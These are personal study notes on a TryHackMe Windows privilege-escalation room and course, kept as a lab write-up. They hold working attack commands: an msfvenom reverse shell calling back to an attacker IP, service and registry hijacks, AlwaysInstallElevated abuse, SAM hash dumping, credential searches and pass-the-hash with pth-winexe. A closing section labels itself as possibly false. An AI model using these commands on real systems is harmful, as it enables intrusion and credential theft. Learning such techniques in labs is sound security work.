@@ -1,0 +1,679 @@
+
+
+Windows PrivEsc
+=================
+
+Note: This box, is kinda deep dive into the windows for my knowledge on powershell, at the time of typing these notes. So I found a course on which the room is based... Now, I am watching the course and walking myself through the room... This way I have video lectures for the problems I solve... *dab* Starting with the course.
+
+Course
+=======
+
+Starting with # are linux command
+
+Starting with > Windows command prompt command
+
+Starting with PS> Windows powershell command
+
+-----------------------------------------------------------
+
+- Setup lab or use the lab on tryhackme
+	- To manually setup the lab, download a vm copy of windows and then run the setup.bat script, restart the vm. Lab setup completed.
+	- Make sure after the lab setup is complete to create a snapshot of the resulting vm, this way you can revert the changes, whenever you want(to default lab).
+
+Following are the type of 
+- User Accounts
+- Service Accounts - Run services, can't use to log in, SYSTEM is the most powerful service account on the system.
+- Groups
+
+Types of resources in windows:
+	- Files/Directories
+	- Registry Entries
+	- Services
+
+Note: if a user or group has to perform an action on these resources that is dependent upon resource's access control list (ACL)
+
+ACL and ACE
+-------------
+
+- Each ACL is made up of zero or more access control entries (ACE)
+
+- Each ACE defines the relationship between principal and a certain access right.
+
+Note: You have viewed this in properties, which allow access modify permissions to system, administrator local user, and user groups to access the file.
+
+Spawning Administrator Shells
+-------------------------------
+
+- msfvenom
+	- Reverse shell can be captured with multi/handler(msf) or netcat.
+
+Note: To escalate from an admin user to full SYSTEM privileges, you can use PsExec tool from Windows Sysinternals
+	- Lol, this is an official tool from windows.
+
+Privilege escalation tools
+---------------------------
+
+- Like, linpeas, the automated privilege escalation script for windows is winpeas.
+
+- Tools we are gonna use to automate the windows privesc enum: winpeas & seatbelt
+	- Check out the tools.zip. It contains both of em. You can transfer files via starting an smb server on attacker machine and then use copy command to copy the winpeas or seatbelt executable(s).
+	- It's always good to use multiple tools and then compare there outputs.
+
+- There are also powerup and sharpup that scans the system for potential vectors to privilege escalate.
+	- Powerup is a powershell script (.ps1)
+		- They both are given in the tools.zip file
+	- Sharpup is a compiled binary (.exe)
+		- You can find both the tools on github.
+To run powerup:
+	- Open powershell
+		- or through the command on a netcat shell: powershell -exec bypass
+		(we are using -exec byass to bypass the default execution policy so we may run the script without any interruptions)
+	
+	- Import the script: . .\PowerUp.ps1
+
+	- Then run: Invoke-Allchecks
+		- This way the script will run and find all potential vectors to privilege escalate.
+Note: PowerUp has some exploit functions in the script, which can be used to perform actual privilege escalation via the script.
+
+Seatbelt:
+	- This enum tool checks for vectors... But... Doesn't actively go for privesc misconfiguration.
+		- However it does provide us with information which we can investigate further.
+
+	- Running seatbelt with no options... It will run the help menu... and it will list the number of checks it performs.
+	- If you want to enumerate everything from seatbelt run it with 'all' option...
+		- .\Seatbelt.exe all
+
+Winpeas is one of the most powerful among the others... 
+	- It not only actively hunts for privilege escalation misconfigurations, it also highlights them for the user to draw attention. #ColorfulOutput
+	- Available on github 
+	- THIS IS THE MOST MAINTAINED TOOL WITH REGULAR UPDATES ON WINDOWS
+Running Winpeas
+	- Before running winpeas we need to add the following registry key:
+		- reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+			- This registry key we just added? Enables colors... Which makes it easier for us to walkthrough the script output.
+Note: If you can't add the registry key... Still you might be able to view colors on terminal in the reverse shell on your attacker machine.
+	
+	- Help menu:
+	> .\winPEASany.exe -h
+	- To run all the checks in winpeas, run the executable without any options from help menu:
+	> .\winPEASany.exe
+	- Run all checks while avoiding time-consuming searches:
+	> .\winPEASany.exe quiet cmd fast
+	- Run specific check categories:
+	> .\winPEASany.exe quiet cmd systeminfo
+
+- There is also one more tool called, accesschk.exe
+	- This tool specifically checks for user and group access control rights... 
+	- The only problem with accesschk is, it requires to accept the agreement on the first run on a system... It's good if you're using rdp because on shell you won't be able to do so...
+		- WITH THE COURSE THE VERSION OF ACCESSCHK.exe IS OLDER... WHICH HAS A COMMAND LINE ARGUMENT /accepteula TO ACCEPT THE AGREEMENT AND CONTINUE THE SCAN. USE IT.
+
+	Accesschk flags
+		-u remove the errors
+		-v verbose
+		-q quiet (no banner)
+		-k (PATH of the REGISTRY ENTRY)
+		-c (name of the service)
+		-d (name of the directory (in case you want to know if you have write permissions to a directory))
+		-p (name of the PROCESS)
+		-w (Only write permissions)
+		-r (Only read permissions)
+
+So, this was the introduction of the course... Now, when I look back at tryhackme, it started to make sense... Let's move ahead with the box.
+
+Generating a reverse shell
+---------------------------
+
+Ez pz... use msfvenom, transfer the reverse shell via smb... and run it...
+
+Cmd: msfvenom -p windows/shell_reverse_tcp -f exe -o reverse.exe LHOST=10.2.26.221 LPORT=1234
+
+Start an "python3 -m http.server 80" add the site to your trusted sites... on the windows vm, internet explorer download the reverse.exe and get a reverse shell.
+	OR
+You could simply start an smbserver with python and then transfer the reverse.exe
+
+
+Note: Now I see, this room is a walkthrough room... All the commands I need to execute are there in the room, so I will watch the respective videos and solve the task... ez pz lmn sqz
+TECHNICAL NOTES
+-----------------
+
+- If there is an access in the name of NT AUTHORITY\INTERACTIVE... Then that privilege is for you... This group comprises of all the users that can login to the machine locally, which exclude all the service accounts and all the user accounts... So checkout for permissions owned by these groups as well. VVIP. Don't miss the chance.
+
+
+Kernel Exploits
+-----------------
+
+- They are so freakin easyyy... I mean, find the windows version with 'systeminfo' cmd... Search for exploits online for a particular version of windows, compile them and run... Booom System shell.
+
+Note: Kernel Exploits are something you wanna keep as a last option because they can seriously damage a system, real bad.
+
+Windows exploit suggester is on github...
+	https://github.com/bitsadmin/wesng
+
+Precompiled Windows kernel exploit
+	https://github.com/SecWiki/windows-kernel-exploits
+	
+Watson is a great tool that suggests kernel exploits on windows.
+	https://github.com/rasta-mouse/Watson
+
+
+Service Exploits
+-----------------
+
+This section is gonna go through how can we enumerate service permissions.
+
+	Service Commands:
+	- Query the configuration of a service
+		sc qc <name>
+	- Query the current status of a service
+		sc query <name>
+	- Modify the configuration option of a service
+		sc config <name> <option>= <value>(Notice the space it's syntax; space between = and <value> whereas <option> immidiately followed by a = sign)
+	- Start/Stop a service
+		net start/stop <name>
+
+We are going to cover the following types of service exploits here...
+	- Insecure Service Permissions
+	- Unquoted Service Path
+	- Weak Registry Permissions
+	- Insecure Service Executables
+	- DLL Hijacking
+
+Insecure Service Permissions
+-------------------------------
+
+Each service has an ACL defined with some service specific permissions. Some are innocuous, some be useful, some be dangerous.
+
+Note: If you have a service which you can access and change it's config and other things, and it runs with SYSTEM privileges... then you can change the executable according to your need and get SYSTEM privileges.
+	- Note: IF YOU CANNOT RESTART THE SERVICE(SAY YOU DON'T HAVE PERMISSIONS TO DO SO) AFTER CHANGING IT'S CONFIGURATION THEN YOU CANNOT PRIVILEGE ESCALATE... 
+		- Because then the only way to privilege escalate is to restart the target's system, for which you (most probably) don't have rights to do that.
+
+Service used in this task... 
+	- DACL (D - ACL) This is a service that identifies that a user/group is assigned or denied access permissions on an object(Here refers to another program)
+
+- As suggested by the room I ran the accesschk.exe on the target and listed the following services for which the user has allowed privileges.
+	- Odd one out, we have the following permissions on this service: SERVICE_CHANGE_CONFIG, SERVICE_START and SERVICE_STOP.
+		- This grants the user to change the service config,start and stop the service.
+
+IP: 10.10.226.249
+
+PS> sc qc daclsvc
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: daclsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DACL Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+Notes for the output: 
+	START_TYPE: tells how the application starts
+	BINARY_PATH_NAME: where's the program located
+	DEPENDENCIES: the application when running requires the data from these dependencies
+
+
+PS> sc query daclsvc
+
+SERVICE_NAME: daclsvc 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 1077  (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+Notes for the output:
+	STATE: specifies whether the service is running or stopped.
+
+Now, according to the room, I am going to change the configuration of this service, and then start the application.
+
+	Change: Binary path... to the location to reverse.exe
+	sc config daclsvc BINARY_PATH_NAME= "C:\PrivEsc\reverse.exe"
+
+Catching, the reverse shell, on a new terminal window with a same port. So when I START THE SERVICE with "net start daclsvc" it gives me a reverse connection on the netcat listener I opened in a new term.
+
+whoami
+nt authority/system (ROOTED)
+
+Unquoted Service Path
+-----------------------
+
+Fuck XD, now I get to know why windows is so fucking vulnerable and all those memes. Nvm, back to the topic.
+
+- The executables in windows can run without extensions (first catch)
+	- eg. "whoami.exe" can run with just "whoami".
+- Some executables take arguments, separated by spaces (second catch)
+
+- The final point is that, these both catches leads to confusion in "windows brain", because of unquoted filepaths and those containing spaces... How?
+	- For example: consider the following unquoted program:
+		C:\Program Files\Some Dir\SomeProgram.exe
+		- To us this obviously runs SomeProgram.exe, but for windows C:\Program can be an executable with 2 args(Files\Some, Dir\SomeProgram.exe) or may be an executable "C:\Program Files\Some" (with arg Dir\SomeProgram.exe)
+			- Windows resolves this ambiguity by checking each possibility in turn.
+
+		- THE HACK IS: If we can write to a particular location before windows checks for the actual executable, we can TRICK THE SERVICE TO EXECUTE OUR BINARY INSTEAD.
+
+
+LMAO note:
+	Windows tryna be smart to read our unquoted commands and reduce effort, well guess it's not smart enough to check what can be possibly correct to execute or not. HAHA fuck you.
+
+Back to the room practical
+----------------------------
+
+With the winpeas we saw that there is a service that runs on the system (which is currently stopped) and has an unquoted path. 
+	- So if we could copy our reverse.exe executable to somewhere valid on this path, and start the service, the windows will look for possible combinations to this path, and ours will execute first, with the rest of the command as argument. Now, because the service is running with SYSTEM privs. we will get a new reverse shell as system on our new listener.
+
+The initial file path:
+	C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+
+We will check the user 'user' permissions on every directory before unquotedpathservice.exe (just in case that any directory have access to the user 'user' so that we can copy the reverse.exe there with the following name suitable)
+	- So I ran accesschk with the following command:
+		.\accesschk.exe /accepteula -uwdq "C:\"
+		.\accesschk.exe /accepteula -uwdq "C:\Program Files"
+		.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
+		
+	- And in the last one it seems like that we user 'user' have permissions to create delete or modify contents in the directory.
+		
+- So, we will copy the reverse.exe binary to,
+	copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+Now, we will start the service with "net start unquotedsvc"
+
+Boom, we got the nt authority/system privilege.
+
+Weak Registry Permissions
+--------------------------
+
+Ok, so this is difficult... I mean I need to do a course on windows powershell and windows user, group, file system etc etc... That deep dive is needed for doing the rest of the room.
+
+Day 2
+========
+
+Ok, so I took sometime, rome here and there... looked out for somethings and when felt a little confident... I watched the complete course... And now I think it's time to complete the room.
+
+Resuming with weak registry permissions
+-----------------------------------------
+
+- Windows registry stores EACH entry for all the services... Therefore, if the compromised user has access to change the registry entry for a service... The user most prolly be able to take over the service as well...
+	- Again, this all falls under the category of having a weak registry permission, but note that registry entries are way bigger than you think... It's hard to query and understand each entry and work according to it.
+
+Practical
+----------
+
+Revising the winpeas scan... We can see that the regsvc is a service running on the box with weak registry permissions...
+	- You can verify the service permissions by simply running...
+	./accesschk.exe /accepteula -uqkv <PATH TO THE SERVICE EXECUTABLE>
+
+	As you can see this will give the list of user/groups who have permission to perform a certain action on the registry.
+
+- In our case it is NT AUTHORITY/INTERACTICE which has full control(i.e. us)... Recalling the technical notes near the top... we can make changes to the registry entry of that particular registry services.
+	- Also, DO NOT FORGET TO CHECK, THAT IF YOU HAVE PERMISSION TO RESTART THE SERVICE. OR NOT. Because if you can't restart the service then the permission is of no use.
+
+Methodology here is, we are going to do the same as in insecure service permissions... Changing the path of the service to our reverse shell executable... Now, if the service is running with the local system privileges... We just got ourselves a system shell.
+	- To query the registry key and see what is the initial configuration, you can run the following.
+
+	reg query <PATH TO THE REGISTRY ENTRY STARTING WITH HK(LM/CU/etc etc).
+
+	To change or add any entry to the registry path... Run the following...
+
+	reg add <path to the registry entry starting with HK> /v <variable name> /t <type name> /d <data> /f 
+
+	Note: /f is to force... So that it won't be able to ask/prompt for a yes in cui(prolly gui)
+
+Once added, open a netcat listener with rlwrap and net start the service. You got the system. 
+
+INSECURE SERVICE EXCUTABLE
+===========================
+ 
+If the service's exucutable is allowed to be modified by the user... Then, we can replace the executable with our reverse shell executable.
+	- Make sure to create a backup of the original service executable, so that when you go for cleaning the tracks you have left (while hacking through the server). It is easy for you to do it.
+ 
+DLL Hijacking
+===============
+ 
+ProcMon64 is a tool to monitor the processes running inside...
+	- We can use this tool to isolate a process and then study what that process is doing and may find something, that can be used to exploit that process.
+	- It is indeed a windows tool #Official
+ 
+Theory:
+ 
+DLL file are nothing just like a custom module made for the main program to run properly... Same like python has module... 
+	- DLL (Dynamic Link Library) are compiled libraries that are loaded by services as a part of their running process.
+ 
+Note: DLLs are executed by the same privileges, that the initiator once had.
+	- So if the DLL that is called, or used by a service with system privileges, AND HAS WRITE ACCESS BY THE USER ATTACKER HAS COMPROMISED, then they can be replaced by a reverse_shell.dll and when ran by the service, provide us with a system shell.
+ 
+Note: A more common misconfiguration that an attacker can use to exploit using DLLs is... When a DLL is missing from the computer, and our compromised user has access rights to the DIRECTORY IN WHICH WINDOWS CHECKS FOR DLL FILES. We can insert our dll there easily by copy.
+ 
+METHODOLOGY
+=============
+ 
+If found a suspicious file(that is ran by localsystem privilege), bring it to a computer that you have admin access to, so you can troubleshoot in peace...
+	- Procmon needs to be used on windows, so see if you can manage that, right now that's not the issue, let's get to the concept.
+ 
+Once on the admin access windows... Open up procmon, stop capturing services... clear all, select only the service you want to troubleshoot(isolate the testing service). Run the file... 99% chances are, that the service looking for any dll won't be found (because we didn't copy them in the first place; lmao). 
+	- Step 2... Check if the NAME NOT FOUND result has been on any directory that you have write access to... IF yes, then congrats, you found a DIRECTORY in which the process look for dll file and YOU HAVE THE WRITE ACCESS. 
+		- Create a reverse shell with -f dll(obvio). and pass it onto the path in the windows machine.
+
+You got the system.
+
+Registry Exploits
+===================
+
+Autorun
+========
+
+Autoruns are those programs that are defined by system administrators or the system itself, to run a service/process/program automatically with a defined privilege of a user, as soon as the windows boots up. 
+
+	- In windows the registry entries for these autorun files are 
+	HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+	And yes this is by default.
+
+	So, do check this out as a vector... And then manually enumerate the services found here, just in case any has a write permission by our user, in it's registry entry or the service executable instead or the both.
+
+Note: This is not in the course but there are services that can be triggered with login of a user... Say an admin user trying to login into his account. So as soon as he logs in the malicious service made by the will trigger... 
+	- Personally, I get here by thinking of spotify ads... I was pissed of ads while writing notes... I mean cmon, give me the damn music... But then I thought spotify also start up with boot. But when I checked the registry entry it was not htere... Later enumerated and found that spotify starts up when a user logs into the system. Easy boy. And what if someone could replace the service entry for spotify to reverse shell, or anything else... So when a user log out and then log back in... DAMNNN it will trigger the reverse shell. I love spotify.
+
+Practical
+----------
+
+Query the registry entry for the autorun application.
+
+	reg query <PATH TO THE AUTORUN (HKLM\...\Run)
+
+Then check that IF any of the autorun executables has any permissions for our cute little compromised user...
+	
+	./accesschk.exe /accepteula -uwqc <path to the service>
+	
+Yes? Great, replace the reverse shell in that location with the same name... Restart the VM and as soon as the service is triggered... you will get a reverse shell.
+
+(MAKE SURE THAT THE AUTORUN EXECUTABLE IS RUNNING AS A MORE PRIVILEGED USER ON BOOT... IF SYSTEM? THEN)
+
+You got the system. 
+
+Always Install Elevated
+=========================
+
+This is also one of the registry entries inside the HKLM. This is actually a feature implemented in the windows, which when enabled allows any file installation to be automatically installed with admin privileges and no prompt for passsword... Well guess that's it.
+	- Now, if we create a reverse shell payload in msfvenom, with an msi format... And then run it on the machine vulnerable to registry exploitation by AlwaysInstallElevated misconfiguration... Then it will give us an elevated shell on our system... 
+
+	- Again repeating... Do use winpeasany.EXE, not the bat version... That might stuck in your shell and then you have to regain the shell on low privileged user.
+
+- Though there's a catch here... For this exploitation to happen AlwaysInstallElevated needs to be enabled in both the locations i.e. for local machine
+
+	HKLM\Software\Policies\Microsoft\Windows\Installer
+	
+as well as for current user...
+
+	HKCU\Software\Policies\Microsoft\Windows\Installer
+
+If either of this is missing or not set, then you can't exploit through this method.
+
+Practical
+-----------
+
+You can query the registry for these keys to see their value, or winpeas can also tell you. 
+
+	reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+	reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+If set to 1... Exploit this via running a payload with msi format.
+
+	To run the msi search online... or simply type this into the current open reverse shell.
+
+	msiexec /quiet /qn /i reverse.msi
+
+You got the system.
+
+PASSWORDS
+===========
+
+Now, this includes hardly... or very little exploitation of services... This whole section... Includes mostly of where to find passwords which we can later use to hash out and then play out with hashcat or jtr (john the ripper)
+
+Passwords stored in registry
+=============================
+
+- This is something done by a number of softwares, the mistake of leaving passwords in the registry, generally the registry is world readable to every user on the system (Including most of the services).
+
+- Winpeas automatically searches for certain well-known paths in the registry for lying passwords... If found... Will be displayed in the output...
+
+- Or else you can manually search for the "password" string inside the registry, which will filter out all the results matching the string "password" (case insensitive) to the prompt. 
+	- Warning: This will you terminal with output so make sure you are logging everything if your term history size is not that long... 
+	- Running the following command will list you the registry key(path), variable(value field) and data field where the string "password" is found.
+
+	reg query HKLM /f password /t REG_SZ /s
+
+	/f is for Findstr password
+	/t is for type REG_SZ
+	/s is for Search recursively.
+
+	Note: https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types 
+		- Checkout the follwoing link to know more about the reg key types.
+
+	- Reg_SZ is for general string type.
+	- REG_EXPAND_SZ is generally used for file paths.
+
+Find the password and login as admin using winexe command in linux.
+
+	winexe -U 'admin%password123' //<IP of the machine> cmd.exe
+
+	Note: user and password in the string are separated by a modulo... '%' sign.
+		- You can see you are logged in as admin user...
+
+Just in case you want to login as SYSTEM user instead, use the --system flag in conjunction to the rest of the command.
+
+	winexe -U 'admin%password123' --system \\<IP of target cmd.exe
+
+Saved Creds
+=============
+
+This method is fairly easy... There is an inbuilt command in windows... runas
+
+	- This command allows you to run other programs as another user... In our case, we need to privilege escalate so we can get a reverse shell by running the reverse.exe as admin user.
+
+	Syntax:
+		runas /user:admin reverse.exe
+
+The catch here is that this command, most of the time requires a password as well (by default configuration), that's where the saved creds come in.
+
+	- Windows can be used to save the user creds if the owner want it to... So, checkout and see whether there are any bydefault creds present in the windows for a privileged user... If yes, combine those creds with runas command and this will make our reverse shell payload run as admin in no time.
+
+You can check for any present saved creds inside windows by the following command
+
+	cmdkey /list
+
+If found any privileged account's saved creds, then run the following command to execute reverse.exe as admin.
+
+	runas /savedcreds /user:<privileged username> <path toreverse.exe> 
+
+Configuration Files
+====================
+
+These files have a high chance containing a password as they are used to configure a thing or two... So to configure that, they will be needing privileges of other higher user for most of the times...
+	- Unattend.xml is a config file that is largely used for automated setup of windwos so it can contain passwords to execute the same. 
+
+Run the following commands to search for the string "password" inside the files and see if you can find anything valuable.
+
+	dir /s *pass* == *.config
+		- Searches for files in the cwd, for the string in name pass or ending with .config.
+
+	findstr /si password *.xml *.ini *.txt
+		- Searches for the string password inside the files ending with .xml .ini or .txt
+
+SAM
+=====
+
+Like /etc/shadow in linux, this file in windows/system32/config directory is where the password of users stored on the system.
+	- However this file is encrypted with a password which can be found in the same directory in the file name called SYSTEM.
+
+Note: These files are generally locked to access while windows is running. 
+	- In that case, there is a slight chance that you can find a backup copy of these in the either of the directory... (not guaranteed). If found, copy them to your local machine and then use hashcat to crack those NTLM hashes.
+
+Once you got the files locally there is a tool called pwdump (a part of creddump suite) which can be used to dump the hashes. (github: https://github.com/Neohapsis/creddump7)
+
+	- The thing is pwdump installed in kali seems to be outdated... It might not work so just git clone the repo.
+	- Also, note that this tool runs python2... So, make sure you have it.
+
+Run the pwdump with the 2 args sam_file and system_file.
+
+	python2 pwdump.py SAM SYSTEM
+
+And this will dump all the hashes for you... Then copy those to 
+
+	HASH FORMAT - USER:<LM HASH>:<NTLM HASH> 
+
+Tip: If an NTLM hash starts with 31d6 then 90% chances are... Either the account has no password or has been disabled.
+	
+Note: For hashcat to crack the password... Only copy the NTLM HASH part from the format.
+
+PASSING THE HASH
+==================
+
+LMAO, windows allows certain services to authenticate with just the password hash... So, no need to crack the password... 
+	- But for OSCP, make sure to create a report as brief as possible, so DO CRACK THE HASH.
+
+This is an option for us to use just in case we are not able to crack the password or the password is too strong to be cracked.
+
+	- You can bypass the windows authentication with hashes, using a modified version of winexe i.e. pth-winexe
+
+	pth-winexe -U '<user>%<LM HASH:NTLM HASH>' //<Target IP> cmd.exe
+
+	Tip: Don't forget to use --system flag to get access as system.
+
+	pth-winexe --system -U '<user>%<LM HASH:NTLM HASH>' //<Target IP> cmd.exe
+
+Scheduled Tasks
+================
+
+These are nothing but cronjobs in windows... These are tasks that are executed at their scheduled timer or every scheduled logon.
+
+Note: As a low privileged user it's not easy for you to view the scheduled task of other users but to view the scheduled tasks for your user by running the following command in cmd.
+	schtasks /query /fo LIST /v
+
+For the same results in powershell run the following command:
+	Get-ScheduledTask 
+
+	- Either of the commands are useful.
+
+- Try to find log files on the system and then read them in case you find scheduled task for another user.
+
+- Now, if found a scheduled task, and if the processes real instance is writable, appedable by the compromised user... Then we can edit that instance (say a batch script or .ps1 module executing time to time) to run our reverse.exe as well, so next time the task execute, it will give us a reverse shell, with the privileges of user that script is running as.
+
+You got the system.
+
+Insecure GUI Apps
+====================
+
+- By the name you can be pretty sure that for this to work you need an RDP/VNC connection to the target.
+
+- This is based on apps that are given permission to run as higher privileged user whenever the program is kicked in. 
+	- I feel like this is the Noobest hack EVERRRR.
+	All you gotta do in that app is go to file, try to open explorer(either by means of opening a new file into the program or to open a new file and save as location or anythng) Once the explorer windows is open go to the address bar and type "cmd.exe". Bam, you got a cmd running as admin.
+
+	The Hack is, the explorer that is opened (to open or save the file as) is opened as admin as it was ignited by the program running as root. Just open the cmd.exe from there
+
+You got privileged.
+
+Start Apps
+============
+
+OMG, this is what I said above that this might not be included in course... BUT THERE CAN BE SERVICES STARTING AS SOON AS A USER BOOTS IN (LIKE SPOTIFY). 
+
+If we put our reverse.exe in the startup directory of the admin user... Then we will get a reverse shell as soon as the admin logs into his account.
+
+By default windows startup directory is:
+	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
+
+	- Now, if you have writable permissions for admin's startup directory... Steal the opportunity lol.
+
+NOTE: There's this catch here... That startup directory only stores links to the programs(said the instructor). To automate commands we can create a vbscript, which when run, create a shortcut placed in (writable by the compromised user) startup directory.
+
+When the admin user logs in... We will get the reverse shell. PING!!
+	- Find the link to the shortcut creator vbs script in tools directory.
+
+Installed Apps
+================
+
+I would say to use this as your lastest option... Because don't forget, half the reason for windows to be so vulnerable is it's 3rd party apps...
+	- So, check for any application exploits you can find on exploit-db. If yes, and you're in luck... You can exploit the application to get your privileges escalated.
+
+	You can use tasklist /V command to list the processes, but again, there will be too many. So instead, I suggest to use seatbelt with argument "NonStandardServices"
+
+	./seatbelt.exe NonStandardProcesses
+
+	This will reduce your scope of view to minimum
+
+THIS IS NOT IT FOR THE ROOM.
+
+Now, there are topics like Token Impersonation and then exploiting the legacy versions of windows... Now, I will create a separate notes on these topics. But for now, let's move on to the strategy.
+
+Highly recommend to give it a read... 
+	- https://github.com/hatRiot/token-priv/
+
+Privilege Escalation Strategy
+===============================
+
+ENUMERATION
+-------------
+
+	- Check your USER GROUP privileges, map your domain to expand upto full potential.
+
+	- Initially run winpeas with quiet searchfast and cmd options
+
+	- Don't stay limited to 1 script... Try the rest in your arsenal and you find in future.
+		- Don't hesitate in creating an automation script for the user.
+
+	- If your scripts are failing it's fine, you can always go and enumerate the system manually, search the exploit db, do more recon on suspicious files... AND DO NOT FORGET PAYLOADALLTHETHINGS REPO... IT'S LIKE THE GOD SENT AN ANGEL FOR THE DEVIL. (#ThrowbackToDeckerstar).
+
+
+THE STRATEGY
+--------------
+
+	- Especially in an exam even if you're time bound... Try to give a deep reading at the results you find from the winpeas.
+
+	- Then formulate even a little suspicious finding... And then create a checklist of all these items
+		DoNOTEThat: If in an exam you can write to a service and but cannot restart the service or the system... Well, that's prolly because THAT'S NOT THE INTENDED ROUTE. Switch.
+
+Note: Always take a quick look around the user's desktop, user's files and other common locations like C:\ and C:\Program Files.
+	- Read through the files that you think CAN AND MAY contain some important information.
+
+- Make sure to try things that doesn't have much steps and a quick test for it, at the first place.
+
+- Have a good look at tasklist and the programs that are running with admin privileges.
+	- As you know that there are a lot of processes that are listed by the tasklist, so you might wanna automate that thing out.
+
+- If still you got nothing... Then re examine your previous results re run a few tasks manually... 
+	- At this point you can start to search for those services which are not seem to odd in look, BUT YOU DON'T KNOW THEM EITHER. Just, so you might be missing those something else which you might find in exploring them...
+	- But before doing that... Make sure, you got a revision of previously done findings. The chances are more that you might be missing something there.
+
+- Whenever you have the thought that the exams is not right... There is nothing for me to go ahead from this... Remember that the exam is intended to be solved, in a time frame. 
+
+Note: if a user has listed some privileges and not showing disabled... Then your compromised user has that permission... Just not available for the current process your running as.
+
+- Do note one thing that you can list user privileges by the following command...
+	
+	whoami /priv
+	
+There are 9 of them. (Atleast, in my knowledge, and a little bit surity from the 'Abusing Token Privilege' paper I semi-read just now). Well, see if you can find any lucky privileges on you. And abuse your way out.
+
+THAT'S IT FOR THE LONGEST ROOM TILL DATE...........
+
+
+
+
+
+
+CACHE: DONOTREAD: MIGHT CONTAIN FALSE INFO
+
+Hot Potato is very smartly made exploit... I am impressed.
+
+getsystem command in meterpreter shell is comprised of 3 files, namedpipe.c elevate.c tokendup.c 
+	- Check the source on github (meterpreter getsystem)
+
+- Do note, that to create the named pipe and token impersonation, the shell needs to be of local admin, or atleast the user must be in admin groups OR have privileges to run a program/service/process as admin.
